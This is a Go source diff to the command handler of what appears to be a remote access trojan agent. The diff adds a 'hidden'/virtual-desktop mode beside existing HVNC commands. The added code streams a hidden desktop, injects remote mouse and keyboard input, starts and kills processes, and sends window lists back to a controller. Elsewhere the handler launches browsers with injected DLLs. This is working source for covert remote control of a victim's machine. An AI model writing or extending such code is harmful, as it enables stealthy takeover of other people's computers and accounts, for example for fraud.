@@ -1009,10 +1009,43 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 	case "hvnc_start":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		autoStartExplorer := false
+		VirtualMode := false
 		if payload != nil {
 			if v, ok := payload["autoStartExplorer"].(bool); ok {
 				autoStartExplorer = v
 			}
+			if v, ok := payload["virtual_mode"].(bool); ok {
+				VirtualMode = v
+			}
+		}
+		if VirtualMode {
+			env.VirtualMu.Lock()
+			if env.VirtualCancel != nil {
+				env.VirtualCancel()
+				waitStreamStop(env.VirtualDone, "hidden")
+			}
+			hiddenCtx, cancel := context.WithCancel(ctx)
+			env.VirtualCancel = cancel
+			done := make(chan struct{})
+			env.VirtualDone = done
+			goSafe("hidden stream", env.Cancel, func() {
+				log.Printf("hidden: start requested (autoStartExplorer=%v)", autoStartExplorer)
+				if err := capture.InitializeVirtualMode(); err != nil {
+					log.Printf("hidden: initialization failed: %v", err)
+					close(done)
+					return
+				}
+				if autoStartExplorer {
+					if _, err := capture.StartVirtualProcess("explorer.exe"); err != nil {
+						log.Printf("hidden: auto-start explorer error: %v", err)
+					}
+				}
+				_ = VirtualStart(hiddenCtx, env)
+				close(done)
+			})
+			env.VirtualMu.Unlock()
+			sendCommandResultSafe(env, cmdID, true, "")
+			return nil
 		}
 		env.HVNCMu.Lock()
 		if env.HVNCCancel != nil {
@@ -1032,6 +1065,22 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
 	case "hvnc_stop":
+		if env.VirtualCancel != nil {
+			env.VirtualMu.Lock()
+			log.Printf("hidden: stop requested")
+			env.VirtualMouseControl = false
+			env.VirtualKeyboardControl = false
+			env.VirtualCursorCapture = false
+			if env.VirtualCancel != nil {
+				env.VirtualCancel()
+			}
+			waitStreamStop(env.VirtualDone, "hidden")
+			env.VirtualCancel = nil
+			env.VirtualDone = nil
+			env.VirtualMu.Unlock()
+			sendCommandResultSafe(env, cmdID, true, "")
+			return nil
+		}
 		env.HVNCMu.Lock()
 		log.Printf("hvnc: stop requested")
 		env.HVNCMouseControl = false
@@ -1080,6 +1129,12 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				enabled = v
 			}
 		}
+		if env.VirtualCancel != nil {
+			log.Printf("hidden: mouse control %v", enabled)
+			_ = VirtualMouseControl(ctx, env, enabled)
+			sendCommandResultSafe(env, cmdID, true, "")
+			return nil
+		}
 		log.Printf("hvnc: mouse control %v", enabled)
 		_ = HVNCMouseControl(ctx, env, enabled)
 		sendCommandResultSafe(env, cmdID, true, "")
@@ -1092,6 +1147,12 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				enabled = v
 			}
 		}
+		if env.VirtualCancel != nil {
+			log.Printf("hidden: keyboard control %v", enabled)
+			_ = VirtualKeyboardControl(ctx, env, enabled)
+			sendCommandResultSafe(env, cmdID, true, "")
+			return nil
+		}
 		log.Printf("hvnc: keyboard control %v", enabled)
 		_ = HVNCKeyboardControl(ctx, env, enabled)
 		sendCommandResultSafe(env, cmdID, true, "")
@@ -1103,6 +1164,12 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			if v, ok := payload["enabled"].(bool); ok {
 				enabled = v
 			}
+		}
+		if env.VirtualCancel != nil {
+			log.Printf("hidden: cursor capture %v", enabled)
+			_ = VirtualCursorControl(ctx, env, enabled)
+			sendCommandResultSafe(env, cmdID, true, "")
+			return nil
 		}
 		log.Printf("hvnc: cursor capture %v", enabled)
 		_ = HVNCCursorControl(ctx, env, enabled)
@@ -1152,7 +1219,14 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				fps = v
 			}
 		}
-		fps = SetHVNCTargetFPS(fps)
+		if env.VirtualCancel != nil {
+			fps = SetVirtualTargetFPS(fps)
+		} else {
+			// Also seed virtual mode so a setting sent immediately before
+			// hvnc_start is retained when that start selects virtual mode.
+			fps = SetHVNCTargetFPS(fps)
+			SetVirtualTargetFPS(fps)
+		}
 		log.Printf("hvnc: set target fps=%d", fps)
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
@@ -1178,10 +1252,6 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
 	case "hvnc_mouse_move":
-		if !env.HVNCMouseControl {
-			sendCommandResultSafe(env, cmdID, true, "")
-			return nil
-		}
 		payload, _ := envelope["payload"].(map[string]interface{})
 		x, y := int32(0), int32(0)
 		if payload != nil {
@@ -1237,11 +1307,23 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			case uint64:
 				y = int32(v)
 			}
+		}
+		if env.VirtualCancel != nil {
+			if !env.VirtualMouseControl {
+				sendCommandResultSafe(env, cmdID, true, "")
+				return nil
+			}
+			capture.VirtualInputMouseMove(x, y)
+			return nil
+		}
+		if !env.HVNCMouseControl {
+			sendCommandResultSafe(env, cmdID, true, "")
+			return nil
 		}
 		enqueueHVNCInput(hvncInputEvent{kind: hvncInputMouseMove, display: env.HVNCSelectedDisplay, x: x, y: y})
 		return nil
 	case "hvnc_mouse_down":
-		if !env.HVNCMouseControl {
+		if env.VirtualCancel == nil && !env.HVNCMouseControl {
 			sendCommandResultSafe(env, cmdID, true, "")
 			return nil
 		}
@@ -1327,11 +1409,20 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			case uint64:
 				y = int32(v)
 			}
+		}
+		if env.VirtualCancel != nil {
+			if !env.VirtualMouseControl {
+				sendCommandResultSafe(env, cmdID, true, "")
+				return nil
+			}
+			_ = capture.VirtualInputMouseMove(x, y)
+			_ = capture.VirtualInputMouseDown(btn)
+			return nil
 		}
 		enqueueHVNCInput(hvncInputEvent{kind: hvncInputMouseDown, display: env.HVNCSelectedDisplay, button: btn, x: x, y: y})
 		return nil
 	case "hvnc_mouse_up":
-		if !env.HVNCMouseControl {
+		if env.VirtualCancel == nil && !env.HVNCMouseControl {
 			sendCommandResultSafe(env, cmdID, true, "")
 			return nil
 		}
@@ -1418,10 +1509,19 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				y = int32(v)
 			}
 		}
+		if env.VirtualCancel != nil {
+			if !env.VirtualMouseControl {
+				sendCommandResultSafe(env, cmdID, true, "")
+				return nil
+			}
+			_ = capture.VirtualInputMouseMove(x, y)
+			_ = capture.VirtualInputMouseUp(btn)
+			return nil
+		}
 		enqueueHVNCInput(hvncInputEvent{kind: hvncInputMouseUp, display: env.HVNCSelectedDisplay, button: btn, x: x, y: y})
 		return nil
 	case "hvnc_mouse_wheel":
-		if !env.HVNCMouseControl {
+		if env.VirtualCancel == nil && !env.HVNCMouseControl {
 			sendCommandResultSafe(env, cmdID, true, "")
 			return nil
 		}
@@ -1508,10 +1608,19 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				y = int32(v)
 			}
 		}
+		if env.VirtualCancel != nil {
+			if !env.VirtualMouseControl {
+				sendCommandResultSafe(env, cmdID, true, "")
+				return nil
+			}
+			_ = capture.VirtualInputMouseMove(x, y)
+			_ = capture.VirtualInputMouseWheel(delta)
+			return nil
+		}
 		enqueueHVNCInput(hvncInputEvent{kind: hvncInputMouseWheel, display: env.HVNCSelectedDisplay, delta: delta, x: x, y: y})
 		return nil
 	case "hvnc_key_down":
-		if !env.HVNCKeyboardControl {
+		if env.VirtualCancel == nil && !env.HVNCKeyboardControl {
 			sendCommandResultSafe(env, cmdID, true, "")
 			return nil
 		}
@@ -1523,11 +1632,19 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		if vk := keyCodeToVKHVNC(code); vk != 0 {
+			if env.VirtualCancel != nil {
+				if !env.VirtualKeyboardControl {
+					sendCommandResultSafe(env, cmdID, true, "")
+					return nil
+				}
+				capture.VirtualInputKeyDown(vk)
+				return nil
+			}
 			enqueueHVNCInput(hvncInputEvent{kind: hvncInputKeyDown, vk: vk})
 		}
 		return nil
 	case "hvnc_key_up":
-		if !env.HVNCKeyboardControl {
+		if env.VirtualCancel == nil && !env.HVNCKeyboardControl {
 			sendCommandResultSafe(env, cmdID, true, "")
 			return nil
 		}
@@ -1539,6 +1656,14 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		if vk := keyCodeToVKHVNC(code); vk != 0 {
+			if env.VirtualCancel != nil {
+				if !env.VirtualKeyboardControl {
+					sendCommandResultSafe(env, cmdID, true, "")
+					return nil
+				}
+				capture.VirtualInputKeyUp(vk)
+				return nil
+			}
 			enqueueHVNCInput(hvncInputEvent{kind: hvncInputKeyUp, vk: vk})
 		}
 		return nil
@@ -1561,6 +1686,20 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			if v, ok := payload["display"].(float64); ok {
 				display = int(v)
 			}
+		}
+		if env.VirtualCancel != nil {
+			log.Printf("hidden: start process %q", filePath)
+			sendCommandResultSafe(env, cmdID, true, "")
+			goSafe("virtual_start_process", nil, func() {
+				if killExe != "" {
+					out, err := exec.Command("taskkill", "/f", "/im", killExe).CombinedOutput()
+					log.Printf("hidden: taskkill /f /im %s: %s (err=%v)", killExe, strings.TrimSpace(string(out)), err)
+				}
+				if _, err := capture.StartVirtualProcess(filePath); err != nil {
+					log.Printf("hidden: start process failed for %q: %v", filePath, err)
+				}
+			})
+			return nil
 		}
 		log.Printf("hvnc: start process %q (kill_exe=%q opera_patch=%v display=%d)", filePath, killExe, operaPatch, display)
 		sendCommandResultSafe(env, cmdID, true, "")
@@ -1593,6 +1732,16 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		return nil
 
 	case "hvnc_kill_all":
+		if env.VirtualCancel != nil {
+			log.Printf("hidden: kill all processes on virtual monitor")
+			sendCommandResultSafe(env, cmdID, true, "")
+			goSafe("virtual_kill_all", nil, func() {
+				if err := capture.VirtualKillAll(); err != nil {
+					log.Printf("hidden: kill all failed: %v", err)
+				}
+			})
+			return nil
+		}
 		log.Printf("hvnc: kill all processes on hidden desktop")
 		sendCommandResultSafe(env, cmdID, true, "")
 		goSafe("hvnc_kill_all", nil, func() {
@@ -1853,6 +2002,281 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			if err := capture.StartHVNCBrowserInjected(browser, exePath, dllBytes, captureDllBytes, clone, cloneLite, killIfRunning, display, onProgress, onDXGIStatus, onLaunchStatus); err != nil {
 				log.Printf("hvnc: browser injected failed for %q: %v", browser, err)
 			}
+		})
+		return nil
+
+	// ==================== HIDDEN MODE COMMANDS ====================
+	case "virtual_start":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		autoStartExplorer := false
+		if payload != nil {
+			if v, ok := payload["autoStartExplorer"].(bool); ok {
+				autoStartExplorer = v
+			}
+		}
+		env.VirtualMu.Lock()
+		if env.VirtualCancel != nil {
+			env.VirtualCancel()
+			waitStreamStop(env.VirtualDone, "hidden")
+		}
+		hiddenCtx, cancel := context.WithCancel(ctx)
+		env.VirtualCancel = cancel
+		done := make(chan struct{})
+		env.VirtualDone = done
+		goSafe("hidden stream", env.Cancel, func() {
+			log.Printf("hidden: start requested (autoStartExplorer=%v)", autoStartExplorer)
+			if err := capture.InitializeVirtualMode(); err != nil {
+				log.Printf("hidden: initialization failed: %v", err)
+				close(done)
+				return
+			}
+			if autoStartExplorer {
+				if _, err := capture.StartVirtualProcess("explorer.exe"); err != nil {
+					log.Printf("hidden: auto-start explorer error: %v", err)
+				}
+			}
+			_ = VirtualStart(hiddenCtx, env)
+			close(done)
+		})
+		env.VirtualMu.Unlock()
+		sendCommandResultSafe(env, cmdID, true, "")
+		return nil
+	case "virtual_stop":
+		env.VirtualMu.Lock()
+		log.Printf("hidden: stop requested")
+		env.VirtualMouseControl = false
+		env.VirtualKeyboardControl = false
+		env.VirtualCursorCapture = false
+		if env.VirtualCancel != nil {
+			env.VirtualCancel()
+		}
+		waitStreamStop(env.VirtualDone, "hidden")
+		env.VirtualCancel = nil
+		env.VirtualDone = nil
+		env.VirtualMu.Unlock()
+		sendCommandResultSafe(env, cmdID, true, "")
+		return nil
+	case "virtual_enable_mouse":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		enabled := true
+		if payload != nil {
+			if v, ok := payload["enabled"].(bool); ok {
+				enabled = v
+			}
+		}
+		log.Printf("hidden: mouse control %v", enabled)
+		_ = VirtualMouseControl(ctx, env, enabled)
+		sendCommandResultSafe(env, cmdID, true, "")
+		return nil
+	case "virtual_enable_keyboard":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		enabled := true
+		if payload != nil {
+			if v, ok := payload["enabled"].(bool); ok {
+				enabled = v
+			}
+		}
+		log.Printf("hidden: keyboard control %v", enabled)
+		_ = VirtualKeyboardControl(ctx, env, enabled)
+		sendCommandResultSafe(env, cmdID, true, "")
+		return nil
+	case "virtual_enable_cursor":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		enabled := false
+		if payload != nil {
+			if v, ok := payload["enabled"].(bool); ok {
+				enabled = v
+			}
+		}
+		log.Printf("hidden: cursor capture %v", enabled)
+		_ = VirtualCursorControl(ctx, env, enabled)
+		sendCommandResultSafe(env, cmdID, true, "")
+		return nil
+	case "virtual_set_fps":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		fps := 120
+		if payload != nil {
+			if v, ok := payloadInt(payload, "fps"); ok {
+				fps = v
+			}
+		}
+		fps = SetVirtualTargetFPS(fps)
+		log.Printf("hidden: set target fps=%d", fps)
+		sendCommandResultSafe(env, cmdID, true, "")
+		return nil
+	case "virtual_set_quality":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		quality := 90
+		codec := ""
+		if payload != nil {
+			if q, ok := payloadInt(payload, "quality"); ok {
+				quality = q
+			}
+			if v, ok := payload["codec"].(string); ok {
+				codec = v
+			}
+		}
+		log.Printf("hidden: set quality=%d codec=%s", quality, codec)
+		capture.SetQualityAndCodec(quality, codec)
+		sendCommandResultSafe(env, cmdID, true, "")
+		return nil
+	case "virtual_request_keyframe":
+		log.Printf("hidden: request full frame")
+		capture.RequestHVNCFullFrame()
+		sendCommandResultSafe(env, cmdID, true, "")
+		return nil
+	case "virtual_mouse_move":
+		if !env.VirtualMouseControl {
+			sendCommandResultSafe(env, cmdID, true, "")
+			return nil
+		}
+		payload, _ := envelope["payload"].(map[string]interface{})
+		x, y := int32(0), int32(0)
+		if payload != nil {
+			if v, ok := payloadInt32(payload, "x"); ok {
+				x = v
+			}
+			if v, ok := payloadInt32(payload, "y"); ok {
+				y = v
+			}
+		}
+		capture.VirtualInputMouseMove(x, y)
+		return nil
+	case "virtual_mouse_down":
+		if !env.VirtualMouseControl {
+			sendCommandResultSafe(env, cmdID, true, "")
+			return nil
+		}
+		payload, _ := envelope["payload"].(map[string]interface{})
+		btn := 0
+		if payload != nil {
+			if v, ok := payload["button"].(float64); ok {
+				btn = int(v)
+			}
+		}
+		capture.VirtualInputMouseDown(btn)
+		return nil
+	case "virtual_mouse_up":
+		if !env.VirtualMouseControl {
+			sendCommandResultSafe(env, cmdID, true, "")
+			return nil
+		}
+		payload, _ := envelope["payload"].(map[string]interface{})
+		btn := 0
+		if payload != nil {
+			if v, ok := payload["button"].(float64); ok {
+				btn = int(v)
+			}
+		}
+		capture.VirtualInputMouseUp(btn)
+		return nil
+	case "virtual_mouse_wheel":
+		if !env.VirtualMouseControl {
+			sendCommandResultSafe(env, cmdID, true, "")
+			return nil
+		}
+		payload, _ := envelope["payload"].(map[string]interface{})
+		delta := int32(0)
+		if payload != nil {
+			if v, ok := payload["delta"].(float64); ok {
+				delta = int32(v)
+			}
+		}
+		capture.VirtualInputMouseWheel(delta)
+		return nil
+	case "virtual_key_down":
+		if !env.VirtualKeyboardControl {
+			sendCommandResultSafe(env, cmdID, true, "")
+			return nil
+		}
+		payload, _ := envelope["payload"].(map[string]interface{})
+		code := ""
+		if payload != nil {
+			if v, ok := payload["code"].(string); ok {
+				code = v
+			}
+		}
+		if vk := keyCodeToVKVirtual(code); vk != 0 {
+			capture.VirtualInputKeyDown(vk)
+		}
+		return nil
+	case "virtual_key_up":
+		if !env.VirtualKeyboardControl {
+			sendCommandResultSafe(env, cmdID, true, "")
+			return nil
+		}
+		payload, _ := envelope["payload"].(map[string]interface{})
+		code := ""
+		if payload != nil {
+			if v, ok := payload["code"].(string); ok {
+				code = v
+			}
+		}
+		if vk := keyCodeToVKVirtual(code); vk != 0 {
+			capture.VirtualInputKeyUp(vk)
+		}
+		return nil
+	case "virtual_start_process":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		filePath := ""
+		if payload != nil {
+			if v, ok := payload["path"].(string); ok {
+				filePath = v
+			}
+		}
+		log.Printf("hidden: start process %q", filePath)
+		sendCommandResultSafe(env, cmdID, true, "")
+		goSafe("virtual_start_process", nil, func() {
+			if _, err := capture.StartVirtualProcess(filePath); err != nil {
+				log.Printf("hidden: start process failed for %q: %v", filePath, err)
+			}
+		})
+		return nil
+	case "virtual_kill_all":
+		log.Printf("hidden: kill all processes on virtual monitor")
+		sendCommandResultSafe(env, cmdID, true, "")
+		goSafe("virtual_kill_all", nil, func() {
+			if err := capture.VirtualKillAll(); err != nil {
+				log.Printf("hidden: kill all failed: %v", err)
+			}
+		})
+		return nil
+	case "virtual_window_list":
+		log.Printf("hidden: window list requested")
+		sendCommandResultSafe(env, cmdID, true, "")
+		goSafe("virtual_window_list", nil, func() {
+			windows, monitors := capture.VirtualEnumWindows()
+			winEntries := make([]wire.HVNCWindowEntry, 0, len(windows))
+			for _, w := range windows {
+				winEntries = append(winEntries, wire.HVNCWindowEntry{
+					Title:       w.Title,
+					X:           w.X,
+					Y:           w.Y,
+					Width:       w.Width,
+					Height:      w.Height,
+					PID:         w.PID,
+					ProcessName: w.ProcessName,
+					Monitor:     w.Monitor,
+				})
+			}
+			monEntries := make([]wire.HVNCMonitorEntry, 0, len(monitors))
+			for _, m := range monitors {
+				monEntries = append(monEntries, wire.HVNCMonitorEntry{
+					Index:   m.Index,
+					Name:    m.Name,
+					X:       m.X,
+					Y:       m.Y,
+					Width:   m.Width,
+					Height:  m.Height,
+					Primary: m.Primary,
+				})
+			}
+			_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCWindowListResult{
+				Type:     "hvnc_window_list_result",
+				Windows:  winEntries,
+				Monitors: monEntries,
+			})
+			log.Printf("hidden: window list sent: %d windows, %d monitors", len(winEntries), len(monEntries))
 		})
 		return nil
 
